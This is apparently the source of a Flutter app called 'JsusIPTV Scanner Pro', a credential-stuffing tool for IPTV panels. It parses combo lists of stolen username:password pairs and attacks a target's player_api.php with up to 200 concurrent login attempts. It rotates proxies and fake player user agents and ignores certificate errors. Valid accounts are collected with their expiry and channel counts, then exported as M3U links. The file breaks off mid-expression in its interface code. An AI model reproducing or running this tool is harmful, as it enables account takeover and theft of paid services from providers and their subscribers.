import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:file_picker/file_picker.dart';
import 'package:share_plus/share_plus.dart';
import 'package:path_provider/path_provider.dart';

void main() => runApp(const JsusApp());

const cG = Color(0xFF00FF41);
const cG2 = Color(0xFF00C832);
const cCy = Color(0xFF00E5FF);
const cYe = Color(0xFFFFD600);
const cRe = Color(0xFFFF1744);
const cMg = Color(0xFFE040FB);
const cDg = Color(0xFF2A5A2A);
const cBg = Color(0xFF000800);
const cBg2 = Color(0xFF010C01);
const cBr = Color(0xFF0A1F0A);

class ComboItem {
  final String user, pass;
  ComboItem(this.user, this.pass);
}

class PanelInfo {
  final int live, vod, series;
  PanelInfo(this.live, this.vod, this.series);
}

class HitItem {
  final String username, password, panel, expira, status, conex, activ, m3u, timezone;
  PanelInfo? panelInfo;
  final String id;
  final DateTime foundAt;
  HitItem({
    required this.username, required this.password, required this.panel,
    required this.expira, required this.status, required this.conex,
    required this.activ, required this.m3u, required this.timezone,
  }) : id = DateTime.now().millisecondsSinceEpoch.toString(),
       foundAt = DateTime.now();
}

final _client = HttpClient()..badCertificateCallback = (_, __, ___) => true;

List<ComboItem> parseCombo(String text) {
  final lines = <ComboItem>[];
  final seen = <String>{};
  final clean = text.replaceAll('\uFEFF','').replaceAll('\r\n','\n').replaceAll('\r','\n');
  for (final raw in clean.split('\n')) {
    final line = raw.trim().replaceAll('\t','').replaceAll('\u0000','');
    if (line.isEmpty || line.startsWith('#') || line.startsWith('//')) continue;
    if (!line.contains(':')) continue;
    final idx = line.indexOf(':');
    final user = line.substring(0, idx).trim();
    final pass = line.substring(idx + 1).trim();
    if (user.isEmpty || pass.isEmpty) continue;
    if (user.toLowerCase().startsWith('http')) continue;
    final key = '${user.toLowerCase()}:$pass';
    if (seen.contains(key)) continue;
    seen.add(key);
    lines.add(ComboItem(user, pass));
  }
  return lines;
}

Future<Map<String, dynamic>?> checkAcc(String panel, String user, String pass, int tout, [String? proxy]) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}';
    final req = await _client.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    req.headers.set('Accept', '*/*');
    req.headers.set('Connection', 'keep-alive');
    final res = await req.close().timeout(Duration(seconds: tout));
    if (res.statusCode >= 500) return null;
    final body = await res.transform(utf8.decoder).join();
    try { return jsonDecode(body) as Map<String, dynamic>; }
    catch (_) {
      if (body.contains('"auth":1') || body.contains('"status":"Active"')) {
        return {'user_info': {'auth': 1, 'status': 'Active'}, 'server_info': {}};
      }
      return null;
    }
  } catch (_) { return null; }
}

Future<PanelInfo> verifyPanel(String panel, String user, String pass) async {
  try {
    final r = await Future.wait([
      _cnt(panel, user, pass, 'get_live_streams'),
      _cnt(panel, user, pass, 'get_vod_categories'),
      _cnt(panel, user, pass, 'get_series_categories'),
    ]);
    return PanelInfo(r[0], r[1], r[2]);
  } catch (_) { return PanelInfo(0, 0, 0); }
}

Future<int> _cnt(String panel, String user, String pass, String action) async {
  try {
    final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}&action=$action';
    final req = await _client.getUrl(Uri.parse(url));
    req.headers.set('User-Agent', _ua());
    final res = await req.close().timeout(const Duration(seconds: 15));
    final body = await res.transform(utf8.decoder).join();
    final data = jsonDecode(body);
    if (data is List) return data.length;
  } catch (_) {}
  return 0;
}

const _uas = [
  'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0',
  'VLC/3.0.20 LibVLC/3.0.20', 'TiviMate/4.7.0', 'IPTVSmarters/3.1.5',
  'okhttp/4.12.0', 'ExoPlayer/2.19.1',
];
String _ua() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];

// ═══ PAINTERS ═══
class MatrixPainter extends CustomPainter {
  final List<List<double>> drops;
  final List<List<String>> chars;
  static const ch = '01アイウエオABCDEF日月火水木<>{}[]|/*&^%#@!';
  MatrixPainter(this.drops, this.chars);
  @override
  void paint(Canvas canvas, Size size) {
    final cols = drops.length;
    final rows = drops[0].length;
    for (var c = 0; c < cols; c++) {
      for (var r = 0; r < rows; r++) {
        final a = drops[c][r];
        if (a <= 0) continue;
        final isHead = r > 0 && drops[c][r-1] <= 0 && a > 0.8;
        final color = isHead ? Colors.white.withOpacity(a * 0.9) : cG.withOpacity(a * 0.3);
        final tp = TextPainter(
          text: TextSpan(text: chars[c][r],
            style: TextStyle(color: color, fontSize: 11, fontFamily: 'monospace',
              fontWeight: isHead ? FontWeight.bold : FontWeight.normal)),
          textDirection: TextDirection.ltr,
        )..layout();
        tp.paint(canvas, Offset(c * 13.0, r * 13.0));
      }
    }
  }
  @override
  bool shouldRepaint(MatrixPainter old) => true;
}

class GridPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()..color = cG.withOpacity(0.025)..strokeWidth = 0.5;
    for (var x = 0.0; x < size.width; x += 40) canvas.drawLine(Offset(x,0), Offset(x,size.height), paint);
    for (var y = 0.0; y < size.height; y += 40) canvas.drawLine(Offset(0,y), Offset(size.width,y), paint);
  }
  @override
  bool shouldRepaint(GridPainter old) => false;
}

class JsusApp extends StatelessWidget {
  const JsusApp({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
    title: 'JsusIPTV Scanner Pro',
    debugShowCheckedModeBanner: false,
    theme: ThemeData(
      scaffoldBackgroundColor: cBg,
      colorScheme: const ColorScheme.dark(primary: cG),
      fontFamily: 'monospace',
      sliderTheme: const SliderThemeData(
        activeTrackColor: cG, thumbColor: cG,
        inactiveTrackColor: cBr, overlayColor: Color(0x2200FF41),
      ),
      scrollbarTheme: ScrollbarThemeData(
        thumbColor: MaterialStateProperty.all(cG.withOpacity(0.3)),
      ),
    ),
    home: const HomeScreen(),
  );
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override
  State<HomeScreen> createState() => _HS();
}

class _HS extends State<HomeScreen> with TickerProviderStateMixin {
  final _srvs = <String>[];
  String? _srv;
  final _combo = <ComboItem>[];
  String _cname = '';
  final _proxies = <String>[];
  final _hits = <HitItem>[];
  final _logs = <String>[];
  bool _scanning = false, _paused = false;
  int _checked = 0, _hn = 0, _fails = 0, _bans = 0, _total = 0;
  int _bots = 50, _tout = 10;
  DateTime? _t0;
  Timer? _timer, _matTimer, _glitchTimer;
  final _srvCtrl = TextEditingController();
  final _rnd = Random();
  bool _glitching = false;
  String _glitchText = 'JsusIPTV Scanner Pro';
  int _tab = 0;

  List<List<double>> _drops = [];
  List<List<String>> _chars = [];
  static const _mch = '01アイウエオABCDEF日月火水<>{}[]|/*&^%#@!';

  late AnimationController _glowAc, _pulseAc, _scanAc;
  late Animation<double> _glow, _pulse, _scan;

  bool get _isDesktop => Platform.isWindows || Platform.isMacOS || Platform.isLinux;

  @override
  void initState() {
    super.initState();
    _glowAc = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _glow = Tween<double>(begin: 0.4, end: 1.0).animate(CurvedAnimation(parent: _glowAc, curve: Curves.easeInOut));
    _pulseAc = AnimationController(vsync: this, duration: const Duration(milliseconds: 600))..repeat(reverse: true);
    _pulse = Tween<double>(begin: 0.3, end: 1.0).animate(CurvedAnimation(parent: _pulseAc, curve: Curves.easeInOut));
    _scanAc = AnimationController(vsync: this, duration: const Duration(seconds: 4))..repeat();
    _scan = Tween<double>(begin: 0.0, end: 1.0).animate(_scanAc);
    _initMatrix();
    _matTimer = Timer.periodic(const Duration(milliseconds: 60), (_) => _tickMatrix());
    _glitchTimer = Timer.periodic(const Duration(seconds: 8), (_) => _triggerGlitch());
  }

  void _initMatrix() {
    const cols = 60, rows = 60;
    _drops = List.generate(cols, (_) => List.generate(rows, (r) => _rnd.nextDouble() > 0.9 ? _rnd.nextDouble() : 0.0));
    _chars = List.generate(cols, (_) => List.generate(rows, (_) => _mch[_rnd.nextInt(_mch.length)]));
  }

  void _tickMatrix() {
    if (!mounted) return;
    setState(() {
      for (var c = 0; c < _drops.length; c++) {
        if (_rnd.nextDouble() < 0.03) _drops[c][0] = 1.0;
        for (var r = _drops[c].length - 1; r > 0; r--) {
          if (_drops[c][r-1] > 0.5 && _drops[c][r] < 0.1) _drops[c][r] = _drops[c][r-1] * 0.95;
          if (_drops[c][r] > 0) {
            _drops[c][r] -= 0.015;
            if (_rnd.nextDouble() < 0.08) _chars[c][r] = _mch[_rnd.nextInt(_mch.length)];
          }
        }
        _drops[c][0] *= 0.92;
      }
    });
  }

  void _triggerGlitch() {
    if (!mounted || _glitching) return;
    setState(() => _glitching = true);
    const gc = '!@#\$%^&*<>?/\\|{}[]';
    int count = 0;
    Timer.periodic(const Duration(milliseconds: 50), (t) {
      if (!mounted) { t.cancel(); return; }
      setState(() {
        _glitchText = count < 8
          ? List.generate('JsusIPTV Scanner Pro'.length, (i) =>
              _rnd.nextDouble() < 0.3 ? gc[_rnd.nextInt(gc.length)] : 'JsusIPTV Scanner Pro'[i]).join()
          : 'JsusIPTV Scanner Pro';
      });
      count++;
      if (count >= 10) { t.cancel(); setState(() => _glitching = false); }
    });
  }

  @override
  void dispose() {
    _glowAc.dispose(); _pulseAc.dispose(); _scanAc.dispose();
    _timer?.cancel(); _matTimer?.cancel(); _glitchTimer?.cancel();
    super.dispose();
  }

  void _log(String m) {
    if (!mounted) return;
    setState(() {
      _logs.insert(0, m);
      if (_logs.length > 500) _logs.removeLast();
    });
  }

  void _toast(String m) => ScaffoldMessenger.of(context).showSnackBar(SnackBar(
    content: Row(children: [
      const Text('> ', style: TextStyle(color: cG, fontFamily: 'monospace', fontWeight: FontWeight.bold)),
      Text(m, style: const TextStyle(color: cG, fontSize: 12, fontFamily: 'monospace')),
    ]),
    backgroundColor: const Color(0xFF010C01),
    duration: const Duration(seconds: 2),
    behavior: SnackBarBehavior.floating,
    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(2), side: const BorderSide(color: cG)),
  ));

  Future<void> _loadCombo() async {
    final r = await FilePicker.platform.pickFiles(
      type: FileType.custom, allowedExtensions: ['txt'], allowMultiple: true);
    if (r == null) return;
    final allLines = <ComboItem>[];
    for (final f in r.files) {
      final text = await File(f.path!).readAsString();
      final parsed = parseCombo(text);
      allLines.addAll(parsed);
      _log('[+] ${f.name} — ${_fmt(parsed.length)} líneas');
    }
    final unique = <String>{};
    final deduped = allLines.where((c) => unique.add('${c.user}:${c.pass}')).toList();
    setState(() {
      _combo.clear(); _combo.addAll(deduped);
      _cname = r.files.length == 1 ? r.files.single.name : '${r.files.length} archivos';
    });
    _log('[+] TOTAL ÚNICOS: ${_fmt(deduped.length)}');
    _toast('${_fmt(deduped.length)} combos listos');
  }

  Future<void> _loadProxies() async {
    final r = await FilePicker.platform.pickFiles(type: FileType.custom, allowedExtensions: ['txt']);
    if (r == null) return;
    final text = await File(r.files.single.path!).readAsString();
    final lines = text.split('\n')
      .map((l) => l.trim())
      .where((l) => l.isNotEmpty && l.contains(':'))
      .toList();
    setState(() { _proxies.clear(); _proxies.addAll(lines); });
    _log('[+] PROXIES: \${lines.length}');
    _toast('\${lines.length} proxies');
  }

  // Parsear proxy en cualquier formato
  // host:port
  // host:port:user:pass
  // socks5://host:port
  // socks5://user:pass@host:port
  String _parseProxy(String raw) {
    raw = raw.trim();
    if (raw.startsWith('socks') || raw.startsWith('http')) return raw;
    final parts = raw.split(':');
    if (parts.length == 2) return 'http://\${parts[0]}:\${parts[1]}';
    if (parts.length == 4) return 'socks5://\${parts[2]}:\${parts[3]}@\${parts[0]}:\${parts[1]}';
    if (parts.length == 3) return 'http://\${parts[0]}:\${parts[1]}';
    return 'http://\$raw';
  }

  void _addSrv() {
    var url = _srvCtrl.text.trim();
    if (url.isEmpty) { _toast('ERROR: Ingresa URL'); return; }
    if (!url.startsWith('http://') && !url.startsWith('https://')) url = 'http://$url';
    url = url.replaceAll(RegExp(r'/+$'), '');
    if (_srvs.contains(url)) { _toast('ERROR: Ya existe'); return; }
    setState(() { _srvs.add(url); _srv = url; });
    _srvCtrl.clear();
    _verifySrv(url);
  }

  Future<void> _verifySrv(String url) async {
    _log('[*] Verificando: $url');
    try {
      final req = await _client.getUrl(Uri.parse('$url/player_api.php?username=test&password=test'));
      req.headers.set('User-Agent', _ua());
      final res = await req.close().timeout(const Duration(seconds: 6));
      if (res.statusCode < 500) {
        _log('[+] ACTIVO (${res.statusCode}) >> $url');
        _toast('SERVIDOR ACTIVO');
      } else {
        _log('[!] ERROR ${res.statusCode}');
      }
    } catch (_) {
      _log('[-] SIN RESPUESTA >> $url');
      _toast('SIN RESPUESTA - AGREGADO');
    }
  }

  Future<void> _startScan() async {
    if (_srv == null) { _toast('ERROR: Sin servidor'); return; }
    if (_combo.isEmpty) { _toast('ERROR: Sin combo'); return; }
    setState(() {
      _scanning = true; _paused = false;
      _checked = 0; _hn = 0; _fails = 0; _bans = 0;
      _total = _combo.length; _t0 = DateTime.now();
    });
    _log('');
    _log('════════════════════════════════════════');
    _log('[*] INICIANDO ATAQUE...');
    _log('[*] TARGET: $_srv');
    _log('[*] COMBO: ${_fmt(_total)} líneas | BOTS: $_bots | TIMEOUT: ${_tout}s');
    _log('════════════════════════════════════════');
    _timer = Timer.periodic(const Duration(milliseconds: 200), (_) { if (mounted) setState(() {}); });
    final q = List<ComboItem>.from(_combo)..shuffle();
    await _runScan(q);
  }

  Future<void> _runScan(List<ComboItem> q) async {
    int pos = 0, active = 0;
    final done = Completer<void>();
    void chk() { if (_checked >= _total && active == 0 && !done.isCompleted) done.complete(); }

    Future<void> work(ComboItem item) async {
      while (_paused && _scanning) await Future.delayed(const Duration(milliseconds: 100));
      if (!_scanning) { active--; chk(); return; }
      String? proxy;
      if (_proxies.isNotEmpty) {
        final raw = _proxies[DateTime.now().millisecondsSinceEpoch % _proxies.length];
        proxy = _parseProxy(raw);
      }
      final data = await checkAcc(_srv!, item.user, item.pass, _tout, proxy);
      if (mounted) setState(() => _checked++);
      if (data != null) {
        final ui = (data['user_info'] as Map?) ?? {};
        final si = (data['server_info'] as Map?) ?? {};
        final auth = ui['auth'];
        final st = ui['status']?.toString().toLowerCase().trim() ?? '';
        final ok = auth == 1 || auth == '1' || auth == true ||
          ['active','activo','enabled','1','premium','trial','free'].contains(st);
        if (ok && st != 'banned' && st != 'disabled') {
          String exp = 'Ilimitado';
          final ts = ui['exp_date'];
          if (ts != null) {
            final n = int.tryParse(ts.toString());
            if (n != null && n > 0) exp = DateTime.fromMillisecondsSinceEpoch(n * 1000).toString().split(' ')[0];
          }
          final hit = HitItem(
            username: item.user, password: item.pass, panel: _srv!,
            expira: exp, status: ui['status']?.toString() ?? 'Active',
            conex: ui['max_connections']?.toString() ?? '?',
            activ: ui['active_cons']?.toString() ?? '0',
            m3u: '$_srv/get.php?username=${Uri.encodeComponent(item.user)}&password=${Uri.encodeComponent(item.pass)}&type=m3u_plus',
            timezone: si['timezone']?.toString() ?? '',
          );
          if (mounted) setState(() { _hits.insert(0, hit); _hn++; });
          _log('[HIT] #$_hn >> ${item.user}:${item.pass} | EXP:$exp');
          verifyPanel(_srv!, item.user, item.pass).then((info) {
            if (mounted) setState(() => hit.panelInfo = info);
            _log('      TV:${info.live} VOD:${info.vod} SER:${info.series}');
          });
        } else {
          if (mounted) setState(() => _fails++);
        }
      } else {
        if (mounted) setState(() => _fails++);
      }
      final br = _bans / (_checked > 0 ? _checked : 1);
      await Future.delayed(Duration(milliseconds: br > 0.3 ? 150 : br > 0.1 ? 50 : 5));
      active--; chk();
    }

    while (pos < q.length && _scanning) {
      if (active < _bots && !_paused) { active++; work(q[pos++]); }
      else await Future.delayed(const Duration(milliseconds: 10));
    }
    await done.future.timeout(const Duration(hours: 24), onTimeout: () {});
    _timer?.cancel();
    if (mounted) setState(() => _scanning = false);
    _log('════════════════════════════════════════');
    _log('[*] SCAN COMPLETADO >> HITS: $_hn | FAIL: $_fails');
    _log('════════════════════════════════════════');
    _toast('COMPLETADO >> $_hn HITS');
  }

  Future<void> _export() async {
    if (_hits.isEmpty) { _toast('ERROR: Sin hits'); return; }
    final sep = '=' * 56;
    final buf = StringBuffer('JsusIPTV Scanner Pro\n$sep\n\n');
    for (var i = 0; i < _hits.length; i++) {
      final h = _hits[i];
      buf.writeln('[HIT #${i+1}]');
      buf.writeln('USER   : ${h.username}');
      buf.writeln('PASS   : ${h.password}');
      buf.writeln('SERVER : ${h.panel}');
      buf.writeln('EXPIRA : ${h.expira}');
      buf.writeln('CONEX  : ${h.activ}/${h.conex}');
      if (h.panelInfo != null) {
        buf.writeln('CANALES: ${h.panelInfo!.live}');
        buf.writeln('VOD    : ${h.panelInfo!.vod}');
        buf.writeln('SERIES : ${h.panelInfo!.series}');
      }
      buf.writeln('M3U    : ${h.m3u}');
      buf.writeln('${'─'*40}\n');
    }
    try {
      final Directory dir;
      if (Platform.isAndroid) {
        dir = (await getExternalStorageDirectory())!;
      } else {
        dir = await getApplicationDocumentsDirectory();
      }
      final file = File('${dir.path}/JsusIPTV_${DateTime.now().toIso8601String().split('T')[0]}.txt');
      await file.writeAsString(buf.toString());
      if (Platform.isAndroid) {
        await Share.shareXFiles([XFile(file.path)]);
      }
      _toast('GUARDADO: ${file.path}');
    } catch (e) {
      _toast('ERROR: $e');
    }
  }

  String get _elapsed {
    if (_t0 == null) return '00:00:00';
    final d = DateTime.now().difference(_t0!);
    return '${d.inHours.toString().padLeft(2,'0')}:${(d.inMinutes%60).toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
  }

  int get _cpm {
    if (_t0 == null || _checked == 0) return 0;
    final s = DateTime.now().difference(_t0!).inSeconds;
    return s > 0 ? (_checked / s * 60).round() : 0;
  }

  double get _pct => _total > 0 ? _checked / _total : 0;

  String _fmt(int n) {
    final s = n.toString();
    final buf = StringBuffer();
    for (var i = 0; i < s.length; i++) {
      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
      buf.write(s[i]);
    }
    return buf.toString();
  }

  String _fn(int n) => n >= 1000 ? '${(n/1000).toStringAsFixed(1)}k' : '$n';

  @override
  Widget build(BuildContext context) => Scaffold(
    backgroundColor: cBg,
    body: Stack(children: [
      Positioned.fill(child: CustomPaint(painter: GridPainter())),
      Positioned.fill(child: CustomPaint(painter: MatrixPainter(_drops, _chars))),
      AnimatedBuilder(animation: _scan, builder: (_, __) => Positioned.fill(
        child: CustomPaint(painter: _ScanLinePainter(_scan.value)))),
      Positioned.fill(child: Container(decoration: BoxDecoration(
        gradient: RadialGradient(center: Alignment.center, radius: 1.2,
          colors: [Colors.transparent, cBg.withOpacity(0.6)])))),
      _isDesktop ? _desktopLayout() : _mobileLayout(),
    ]),
  );

  // ═══ DESKTOP LAYOUT ═══
  Widget _desktopLayout() => SafeArea(child: Column(children: [
    _desktopHeader(),
    Expanded(child: Row(children: [
      // Left sidebar - Config
      Container(
        width: 280,
        decoration: BoxDecoration(
          color: cBg2.withOpacity(0.92),
          border: Border(right: BorderSide(color: cG.withOpacity(0.15))),
        ),
        child: _desktopSidebar(),
      ),
      // Center - Scan
      Expanded(child: _desktopCenter()),
      // Right sidebar - Hits
      Container(
        width: 350,
        decoration: BoxDecoration(
          color: cBg2.withOpacity(0.92),
          border: Border(left: BorderSide(color: cG.withOpacity(0.15))),
        ),
        child: _desktopHits(),
      ),
    ])),
    _desktopStatusBar(),
  ]));

  Widget _desktopHeader() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
    decoration: BoxDecoration(
      color: cBg2.withOpacity(0.97),
      border: Border(bottom: BorderSide(color: cG.withOpacity(0.3))),
      boxShadow: [BoxShadow(color: cG.withOpacity(0.05), blurRadius: 20)],
    ),
    child: Row(children: [
      // Logo
      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
        width: 40, height: 40,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(4),
          border: Border.all(color: cG.withOpacity(0.5)),
          boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value * 0.4), blurRadius: 15)],
        ),
        child: ClipRRect(borderRadius: BorderRadius.circular(3),
          child: Image.asset('android-icon/icon.png',
            errorBuilder: (_, __, ___) => Container(color: cBg2,
              child: const Center(child: Text('Js',
                style: TextStyle(color: cG, fontSize: 14, fontWeight: FontWeight.bold)))))),
      )),
      const SizedBox(width: 14),
      // Title
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        AnimatedBuilder(animation: _glow, builder: (_, __) => Text(_glitchText,
          style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold,
            fontFamily: 'monospace', letterSpacing: 2,
            foreground: Paint()..shader = LinearGradient(
              colors: [cG, cCy, cG]).createShader(const Rect.fromLTWH(0,0,300,25)),
            shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
        Text('PRO v5.0  ·  POTENCIA · PRECISION · VELOCIDAD',
          style: TextStyle(fontSize: 9, color: cDg.withOpacity(0.8), letterSpacing: 2)),
      ]),
      const Spacer(),
      // Stats header
      Row(children: [
        _hdrStat('HITS', '$_hn', cG),
        const SizedBox(width: 20),
        _hdrStat('CPM', _fmt(_cpm), cYe),
        const SizedBox(width: 20),
        _hdrStat('CHECKED', _fmt(_checked), cCy),
        const SizedBox(width: 20),
        _hdrStat('TOTAL', _fmt(_total), cDg),
        const SizedBox(width: 30),
      ]),
      // Status
      AnimatedBuilder(animation: _pulse, builder: (_, __) => Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
        decoration: BoxDecoration(
          color: (_scanning ? cG : cRe).withOpacity(0.08),
          borderRadius: BorderRadius.circular(2),
          border: Border.all(color: (_scanning ? cG : cRe).withOpacity(0.5)),
          boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value * 0.3), blurRadius: 15)],
        ),
        child: Row(children: [
          Container(width: 7, height: 7, decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _scanning ? cG : cRe,
            boxShadow: [BoxShadow(color: (_scanning ? cG : cRe).withOpacity(_pulse.value), blurRadius: 8)],
          )),
          const SizedBox(width: 6),
          Text(_scanning ? '● ONLINE' : '○ IDLE',
            style: TextStyle(fontSize: 11, letterSpacing: 2,
              color: _scanning ? cG : cRe, fontFamily: 'monospace',
              fontWeight: FontWeight.bold)),
        ]),
      )),
    ]),
  );

  Widget _hdrStat(String label, String val, Color c) => Column(
    crossAxisAlignment: CrossAxisAlignment.center, children: [
    Text(val, style: TextStyle(fontSize: 16, color: c, fontFamily: 'monospace',
      fontWeight: FontWeight.bold, shadows: [Shadow(color: c, blurRadius: 8)])),
    Text(label, style: TextStyle(fontSize: 8, color: c.withOpacity(0.6), letterSpacing: 2)),
  ]);

  Widget _desktopSidebar() => ListView(padding: const EdgeInsets.all(12), children: [
    _dsecTitle('TARGET'),
    const SizedBox(height: 8),
    TextField(
      controller: _srvCtrl,
      style: const TextStyle(color: cG, fontSize: 11, fontFamily: 'monospace'),
      decoration: InputDecoration(
        hintText: 'http://server:port',
        hintStyle: TextStyle(color: cDg.withOpacity(0.5), fontSize: 11, fontFamily: 'monospace'),
        filled: true, fillColor: Colors.black54,
        prefixText: '>> ', prefixStyle: const TextStyle(color: cG, fontFamily: 'monospace'),
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: BorderSide(color: cG.withOpacity(0.3))),
        enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: BorderSide(color: cG.withOpacity(0.3))),
        focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(2), borderSide: const BorderSide(color: cG, width: 1.5)),
        contentPadding: const EdgeInsets.symmetric(horizontal: 10, vertical: 10),
      ),
      onSubmitted: (_) => _addSrv(),
    ),
    const SizedBox(height: 6),
    _dBtn('[ CONNECT ]', cCy, _addSrv),
    const SizedBox(height: 8),
    if (_srvs.isNotEmpty) ...[
      ..._srvs.asMap().entries.map((e) => Container(
        margin: const EdgeInsets.only(bottom: 4),
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 6),
        decoration: BoxDecoration(
          color: e.value == _srv ? cG.withOpacity(0.06) : Colors.transparent,
          border: Border.all(color: e.value == _srv ? cG.withOpacity(0.4) : cBr),
          borderRadius: BorderRadius.circular(2),
        ),
        child: Row(children: [
          Container(width: 5, height: 5, decoration: const BoxDecoration(
            shape: BoxShape.circle, color: cG,
            boxShadow: [BoxShadow(color: cG, blurRadius: 4)])),
          const SizedBox(width: 6),
          Expanded(child: Text(e.value, style: const TextStyle(fontSize: 9, color: cCy, fontFamily: 'monospace'),
            overflow: TextOverflow.ellipsis)),
          GestureDetector(
            onTap: () => setState(() { _srvs.removeAt(e.key); _srv = _srvs.isNotEmpty ? _srvs[0] : null; }),
            child: const Text('[X]', style: TextStyle(color: cRe, fontSize: 9, fontFamily: 'monospace'))),
        ]),
      )),
      const SizedBox(height: 10),
    ],
    _dsecTitle('WORDLIST'),
    const SizedBox(height: 8),
    Container(
      padding: const EdgeInsets.all(8),
      decoration: BoxDecoration(
        color: _combo.isEmpty ? cRe.withOpacity(0.05) : cG.withOpacity(0.05),
        border: Border.all(color: _combo.isEmpty ? cRe.withOpacity(0.3) : cG.withOpacity(0.3)),
        borderRadius: BorderRadius.circular(2),
      ),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Row(children: [
          Container(width: 6, height: 6, decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: _combo.isEmpty ? cRe : cG,
            boxShadow: [BoxShadow(color: _combo.isEmpty ? cRe : cG, blurRadius: 4)])),
          const SizedBox(width: 6),
          Expanded(child: Text(_combo.isEmpty ? 'NOT LOADED' : _cname,
            style: TextStyle(fontSize: 9, color: _combo.isEmpty ? cRe : cYe, fontFamily: 'monospace'),
            overflow: TextOverflow.ellipsis)),
        ]),
        if (_combo.isNotEmpty) ...[
          const SizedBox(height: 4),
          Text('${_fmt(_combo.length)} entries', style: const TextStyle(fontSize: 10, color: cG,
            fontFamily: 'monospace', fontWeight: FontWeight.bold)),
        ],
      ]),
    ),
    const SizedBox(height: 6),
    _dBtn('[ LOAD WORDLIST ]', cYe, _loadCombo),
    const SizedBox(height: 16),
    _dsecTitle('PARAMETERS'),
    const SizedBox(height: 8),
    Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text('THREADS:', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
      Text('$_bots', style: const TextStyle(fontSize: 14, color: cG,
        fontFamily: 'monospace', fontWeight: FontWeight.bold,
        shadows: [Shadow(color: cG, blurRadius: 8)])),
    ]),
    Slider(value: _bots.toDouble(), min: 1, max: 200,
      onChanged: (v) => setState(() => _bots = v.round())),
    Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text('TIMEOUT:', style: TextStyle(fontSize: 9, color: cDg, fontFamily: 'monospace')),
      Text('${_tout}s', style: const TextStyle(fontSize: 14, color: cCy,
        fontFamily: 'monospace', fontWeight: FontWeight.bold)),
    ]),
    Slider(value: _tout.toDouble(), min: 5, max: 30,
      activeColor: cCy, thumbColor: cCy,
      onChanged: (v) => setState(() => _tout = v.round())),
    const SizedBox(height: 8),
    Row(children: [
      Expanded(child: _dParamBox('PROXY', _proxies.isEmpty ? 'NONE' : '${_proxies.length}', cMg)),
      const SizedBox(width: 6),
      Expanded(child: _dParamBox('MODE', 'NATIVE', cG)),
    ]),
    const SizedBox(height: 8),
    _dBtn('[ LOAD PROXIES ]', cMg, _loadProxies),
  ]);

  Widget _desktopCenter() => Column(children: [
    // Progress area
    Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cBg2.withOpacity(0.7),
        border: Border(bottom: BorderSide(color: cG.withOpacity(0.1))),
      ),
      child: Column(children: [
        // Big stats row
        Row(children: [
          Expanded(child: _bigStatCard('HITS', '$_hn', cG)),
          const SizedBox(width: 10),
          Expanded(child: _bigStatCard('FAIL', _fmt(_fails), cRe)),
          const SizedBox(width: 10),
          Expanded(child: _bigStatCard('BANS', '$_bans', cYe)),
          const SizedBox(width: 10),
          Expanded(child: _bigStatCard('CPM', _fmt(_cpm), cYe)),
        ]),
        const SizedBox(height: 16),
        // Progress bar
        if (_total > 0) ...[
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            AnimatedBuilder(animation: _glow, builder: (_, __) => Text(
              '${(_pct*100).toStringAsFixed(3)}%',
              style: TextStyle(fontSize: 20, color: cG, fontFamily: 'monospace',
                fontWeight: FontWeight.bold,
                shadows: [Shadow(color: cG.withOpacity(_glow.value), blurRadius: 15)]))),
            Text('${_fmt(_checked)} / ${_fmt(_total)} entries',
              style: TextStyle(fontSize: 11, color: cDg, fontFamily: 'monospace')),
            Text(_elapsed, style: const TextStyle(fontSize: 14, color: cCy,
              fontFamily: 'monospace', fontWeight: FontWeight.bold)),
          ]),
          const SizedBox(height: 8),
          Stack(children: [
            Container(height: 12, decoration: BoxDecoration(
              color: cBr, borderRadius: BorderRadius.circular(2),
              border: Border.all(color: cG.withOpacity(0.2)))),
            AnimatedContainer(
              duration: const Duration(milliseconds: 150),
              height: 12,
              width: (MediaQuery.of(context).size.width - 680) * _pct,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(2),
                gradient: const LinearGradient(colors: [Color(0xFF003310), cG2, cG]),
                boxShadow: [BoxShadow(color: cG.withOpacity(0.5), blurRadius: 10)],
              ),
            ),
          ]),
          const SizedBox(height: 12),
        ],
        // Control buttons
        Row(children: [
          Expanded(child: _dBtn(
